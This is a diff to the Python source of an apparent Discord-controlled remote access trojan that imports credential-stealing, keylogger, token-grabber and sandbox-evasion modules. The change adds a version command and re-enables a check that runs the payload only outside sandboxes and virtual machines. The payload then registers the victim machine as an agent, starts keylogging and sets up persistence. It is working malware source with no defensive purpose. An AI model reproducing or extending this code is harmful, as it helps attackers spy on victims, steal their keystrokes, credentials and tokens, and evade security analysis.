@@ -27,6 +27,8 @@ from winreg import *
 from ctypes import *
 from libraries import credentials,keylogger,tokengrabber,sandboxevasion
 
+VERSION = "v1.1.3"
+
 KEYLOG = {KEYLOG}
 PERSISTENT = {PERSISTENT}
 
@@ -384,6 +386,14 @@ async def ls(context):
 
     await context.message.channel.send(embed=my_embed)
 
+@client.command(name='version')
+async def version(context):
+    command = context.message.content.replace("!version ", "")
+    word_list = command.split()
+    if word_list[0] == str(ID):
+         my_embed = discord.Embed(title=f"Agent#{ID} Version:{VERSION}", color=0x0000FF)
+         await context.message.channel.send(embed=my_embed)
+
 @client.command(name='terminate')
 async def terminate(context):
     command = context.message.content.replace("!terminate ", "")
@@ -434,49 +444,49 @@ async def on_ready():
     my_embed.add_field(name="**Auto Keylogger**", value=KEYLOG, inline=True)
     await channel.send(embed=my_embed)
 
-#if sandboxevasion.test() == True and isVM() == False:
-ISVM = isVM()
-OS = getOS()
-CPU = getCPU()
-IP = getIP()
-BITS = getBits()
-HOSTNAME = getHostname()
-USERNAME = getUsername()
-createConfig()
-createUploads()
-ISADMIN = isAdmin()
+if sandboxevasion.test() == True and isVM() == False:
+    ISVM = isVM()
+    OS = getOS()
+    CPU = getCPU()
+    IP = getIP()
+    BITS = getBits()
+    HOSTNAME = getHostname()
+    USERNAME = getUsername()
+    createConfig()
+    createUploads()
+    ISADMIN = isAdmin()
 
-try:
-    path = fr"C:\Users\{USERNAME}\.config\ID"
-    with open(path, "r+") as IDfile:
-        ID = IDfile.read()
-        if ID == "":
-            ID = random.randint(1, 10000)
-            IDfile.write(str(ID))
-            MSG = f"New Agent Online #{ID}"
-            color = 0x00ff00
-        else:
-            MSG = f"Agent Online #{ID}"
-            color = 0x0000FF
+    try:
+        path = fr"C:\Users\{USERNAME}\.config\ID"
+        with open(path, "r+") as IDfile:
+            ID = IDfile.read()
+            if ID == "":
+                ID = random.randint(1, 10000)
+                IDfile.write(str(ID))
+                MSG = f"New Agent Online #{ID}"
+                color = 0x00ff00
+            else:
+                MSG = f"Agent Online #{ID}"
+                color = 0x0000FF
 
-except Exception:
-    path = fr"C:\Users\{USERNAME}\.config\ID"
-    with open(path, "w+") as IDfile:
-        ID = IDfile.read()
-        if ID == "":
-            ID = random.randint(1, 10000)
-            IDfile.write(str(ID))
-            MSG = f"New Agent Online #{ID}"
-            color = 0x00ff00
-        else:
-            MSG = f"Agent Online #{ID}"
-            color = 0x0000FF
+    except Exception:
+        path = fr"C:\Users\{USERNAME}\.config\ID"
+        with open(path, "w+") as IDfile:
+            ID = IDfile.read()
+            if ID == "":
+                ID = random.randint(1, 10000)
+                IDfile.write(str(ID))
+                MSG = f"New Agent Online #{ID}"
+                color = 0x00ff00
+            else:
+                MSG = f"Agent Online #{ID}"
+                color = 0x0000FF
 
-if KEYLOG:  
-    threading.Thread(target=keylogs).start()
-if PERSISTENT:
-    autoPersistent()
+    if KEYLOG:  
+        threading.Thread(target=keylogs).start()
+    if PERSISTENT:
+        autoPersistent()
 
-client.run(BOT_TOKEN)
-# else:
-#     exit()
+    client.run(BOT_TOKEN)
+else:
+    exit()
